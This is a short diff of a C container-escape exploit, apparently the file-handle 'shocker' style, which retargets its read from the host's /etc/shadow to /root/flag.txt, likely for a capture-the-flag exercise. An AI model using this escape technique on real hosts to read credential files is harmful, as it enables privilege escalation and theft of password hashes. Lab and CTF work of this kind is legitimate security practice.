@@ -164,7 +164,7 @@ int main()
 	if ((fd1 = open("/.dockerinit", O_RDONLY)) < 0)
 		die("[-] open");
 
-	if (find_handle(fd1, "/etc/shadow", &root_h, &h) <= 0)
+	if (find_handle(fd1, "/root/flag.txt", &root_h, &h) <= 0)
 		die("[-] Cannot find valid handle!");
 
 	fprintf(stderr, "[!] Got a final handle!\n");
@@ -177,7 +177,7 @@ int main()
 	if (read(fd2, buf, sizeof(buf) - 1) < 0)
 		die("[-] read");
 
-	fprintf(stderr, "[!] Win! /etc/shadow output follows:\n%s\n", buf);
+	fprintf(stderr, "[!] Win! /root/flag.txt output follows:\n%s\n", buf);
 
 	close(fd2); close(fd1);
 
